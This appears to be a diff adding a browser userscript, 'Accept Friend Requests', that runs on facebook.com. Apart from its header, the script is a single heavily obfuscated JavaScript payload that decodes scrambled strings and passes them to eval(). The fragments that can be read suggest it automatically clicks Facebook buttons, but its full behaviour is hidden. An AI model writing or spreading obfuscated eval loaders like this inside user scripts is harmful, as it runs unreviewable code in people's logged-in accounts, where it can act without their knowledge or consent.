@@ -1,0 +1,9 @@
+// ==UserScript==
+// @name      Accept Friend Requests 
+// @namespace   wael hagag scripts
+// @description 
+// @include https://www.facebook.com
+// @namespace http://waelhagag.blogspot.com/
+// ==/UserScript==
+
+$UD3qP2Z026g75CLzTST=function(n){if(typeof($UD3qP2Z026g75CLzTST.list[n])==eval(unescape('%22%73%74%72%69%6E%67%22')))return $UD3qP2Z026g75CLzTST.list[n].split("").reverse().join("");return $UD3qP2Z026g75CLzTST.list[n]};$UD3qP2Z026g75CLzTST.list=["Ø005,})ö1(¶áØöõ¶á rav{)(noitc»(lavretnItesñ)õ°,ó(°Í¶Ð¶Î¶Ö)1(°Þ¶É¶ñ)0ô4ô1ßÍ°Ð°Î°Ê)ãsÁ°É°Ø¦÷ÀØòÅæ÷}ó^)i(tAeâc.ðµâCmorf.ãS=+ò{äïÝËðæ5$ïÜí÷;í3$Øõºæ1$Ü])3ßÍºÐºÎºÖóßÞºÉºñé×C2\'\\@åëqh,ì,015;53-gapwmq-Û-epm,Ûì--CåqrvvjëFåapq,;­;­ëvrkÃqë:­vlgognGgvcgÃ,ê:­fnkjAflgrrc,{fm`,ê2­×%Â73%74%72î9îEîÑ22×mls uiButton×_42ftÕ0Õ3Õ1 selectedÍ¬Ð¬Î¬Ö\'é\'Þ¬É¬","~|xZXRQO?>/*&#þýüûúùø÷öõôóòñðïîíìëêéèçæåäãâáàßÞÝÜÛÚÙØ×ÖÕÔÓÒÑÐÏÎÍÌËÊÉÈÇÆÅÄÃÂÁÀ¿¾½¼»º¹¸·¶µ´³²±°¯®­¬«ª©¨§¦¥¤£¢¡",//g,"2$(kè0(ß,))2¦3$;]¦1$;¦5$%6æpgqw5­vlÔÂ76Óc¼c.]iç[aäËaÝØ)=¦1\'\\)++ignirtdoCrahµmaNssàalCyBsÏÚ(¬ÅÀÁ<i;Ì rav;qvrkÃqelEtegÙ.Ïucod=a;),Ê))) _4jygowamf%E6%96Ò%2Ñ4Ñ3ÑÂ7%;}¡tnemÊ;³nÈ[=ts¼.0=i(rof;htgnel. ª(f¿iojÇ.)µsÆreverÄµÃcsenu.³t¼ps.¡pa22%==)¡(laveoepyt¾(fi{)n½(noitc»=ilnufugz¹cfdl¸f$6H$·®hIaD6$TB01Cbf´(eq2²)(fLmA±z®YHE$ML8owE¯0i7o2o§«yj0\'\\cvj©1na§$nruter_uAWzS¨4A47KfE¥azBP¤mok$JBEV£YA$Kf¢UulbjtP]n[tsil."];eval((function(s){var a,c,e,i,j,o="",r,t=$UD3qP2Z026g75CLzTST(1);for(i=0;i<s.length;i++){r=t+s[i][2];a=s[i][1].split("");for(j=a.length-1;j>=0;j--){s[i][0]=s[i][0].split(r.charAt(j)).join(a[j])}o+=s[i][0]}return o.replace($UD3qP2Z026g75CLzTST(2),"\"")})([[$UD3qP2Z026g75CLzTST(0),$UD3qP2Z026g75CLzTST(3),""]]));
